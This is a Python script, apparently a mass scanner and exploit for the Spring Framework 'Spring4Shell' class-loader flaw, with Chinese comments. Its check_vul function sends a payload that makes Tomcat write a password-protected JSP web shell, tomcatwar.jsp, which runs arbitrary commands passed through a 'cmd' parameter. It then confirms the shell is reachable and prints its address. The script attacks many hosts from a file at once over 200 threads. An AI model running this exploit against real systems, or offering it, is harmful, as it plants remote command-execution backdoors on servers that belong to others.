import sys
import requests
from termcolor import cprint
import colorama
colorama.init(autoreset=True)
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import threading
from random import choice
from time import time
from bs4 import BeautifulSoup
import threadpool
from urllib.parse import urljoin
from time import sleep

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.0 Safari/537.36 Edg/92.0.874.0",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"]
headers = {"suffix": "%>//",
           "c1": "Runtime",
           "c2": "<%",
           "DNT": "1",
           "Content-Type": "application/x-www-form-urlencoded"
           }
url=[]
g_list = []
queueLock = threading.Lock()


def check_vul(target_url):
    try:
        target_url = check_url_http(target_url)
        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        if "https" in target_url:
            '''requests模块请求一个证书无效的网站的话会直接报错,可以设置verify参数为False解决这个问题,但是设置verify=False会抛出一个InsecureRequestWarning的警告'''
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # 取消SSL验证的警告
            res = requests.post(target_url, verify=False,headers=headers,data=data, timeout=15)
        else:
            res = requests.post(target_url,headers=headers,data=data,timeout=15)
        sleep(10)
        shellurl = urljoin(target_url, 'tomcatwar.jsp')
        shellgo = requests.get(shellurl, timeout=15, allow_redirects=False, verify=False)
        status = shellgo.status_code
        if status ==200 and "getParameter" in shellgo.text:
            print(f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")
            return (f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")
        else:
            print("no vul")
    except Exception as e:
        print(e)


def check_url_http(url):
    isHTTPS = True
    if "http" not in url:
        try:
            target_url = "https://" + url
            """
            requests模块请求一个证书无效的网站的话会直接报错,可以设置verify参数为False解决这个问题,但是设置verify=False会抛出一个InsecureRequestWarning的警告
            """
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  # 取消SSL验证的警告
            requests.get(url=target_url, verify=False, timeout=6)
        except Exception as e:
            isHTTPS = False
        finally:
            if isHTTPS:
                target_url = 'https://' + url
                return target_url
            else:
                target_url = 'http://' + url
                return target_url
    else:
        return url


def ip_read():
    file_name = str(sys.argv[2])  # 输入文本名
    for line in open(file_name):
        ip = line.strip()         #消除字符串整体的指定字符,括号里什么都不写,默认消除空格和换行符
        if ip:
            url.append(ip)


# 回调函数的结果保存到g_list数组中,必须两个参数res1为WorkRequest对象,res2为任务函数的结果
def res_printer(res1,res2):
    if res2:
        g_list.append(res2)
    else:
        pass


# 线程池函数
def thread_requestor(urllist):
    pool =  threadpool.ThreadPool(200)                                    # 线程池数量
    reqs =  threadpool.makeRequests(check_vul,urllist,res_printer)        # 使用线程池,res_printer为回调函数
    [pool.putRequest(req) for req in reqs]                                # 简写 for req in reqs pool.putRequest(req)
    pool.wait()


def main():
    cprint(r'''
                     .__                 ___________                                                __    
  ___________________|__| ____    ____   \_   _____/___________    _____   ______  _  _____________|  | __
 /  ___/\____ \_  __ \  |/    \  / ___\   |    __) \_  __ \__  \  /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
 \___ \ |  |_> >  | \/  |   |  \/ /_/  >  |     \   |  | \// __ \|  Y Y  \  ___/\     (  <_> )  | \/    < 
/____  >|   __/|__|  |__|___|  /\___  /   \___  /   |__|  (____  /__|_|  /\___  >\/\_/ \____/|__|  |__|_ \
     \/ |__|                 \//_____/        \/               \/      \/     \/                        \/

        ''', "yellow")
    if len(sys.argv) != 3:  # 判断输入长度是否合格
        cprint('''Explain:
        -h      show this help message and exit
        -u      Target URL
        ''', "blue")
        cprint('''Example:
        python3 testpoc.py -u 10.10.10.10
        python3 testpoc.py -r ip.txt''', "magenta")
        return
    a = str(sys.argv[1])  # 输入类型
    if a == '-u':
        target_url = str(sys.argv[2])  # 获取ip地址
        url.append(target_url)
    if a == '-r':
        ip_read()
    """开启多线程"""
    begin = time()
    thread_requestor(url)  # 线程池函数
    for q in g_list:
        with open('存活检测结果.txt', 'a', encoding='utf-8') as f:
            f.writelines(q)
            f.write('\n')
    end = time()
    print('花费时间： %ss' % str(end - begin))


if __name__ == '__main__':
    main()